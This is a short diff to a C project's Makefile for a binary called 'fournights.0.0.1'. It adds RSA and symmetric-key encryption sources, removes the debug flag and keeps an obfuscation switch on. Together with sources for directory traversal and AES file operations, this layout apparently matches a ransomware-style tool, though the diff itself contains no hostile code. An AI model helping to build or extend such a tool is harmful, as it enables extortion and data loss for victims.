@@ -7,6 +7,8 @@ SRC=$(SRC_DIR)/file_operations.c \
 	$(SRC_DIR)/main.c \
 	$(SRC_DIR)/memory_management.c \
 	$(SRC_DIR)/openssl_aes.c \
+	$(SRC_DIR)/openssl_rsa.c \
+	$(SRC_DIR)/openssl_encrypt_sym_key.c \
 	$(SRC_DIR)/traverse_dir.c \
 	$(SRC_DIR)/search.c \
 	$(SRC_DIR)/string_funcs.c \
@@ -16,7 +18,7 @@ OBJ=$(SRC:.c=.o)
 NAME=fournights.0.0.1
 LIB_DIR=-Llib
 LIBS=-lcrypto -ldl
-CFLAGS=-Wall -Werror -Wextra -pedantic -g -I $(INCL_DIR) 
+CFLAGS=-Wall -Werror -Wextra -pedantic -D__arch64__ -I $(INCL_DIR) 
 
 DEBUG=0
 OBFUSC=1
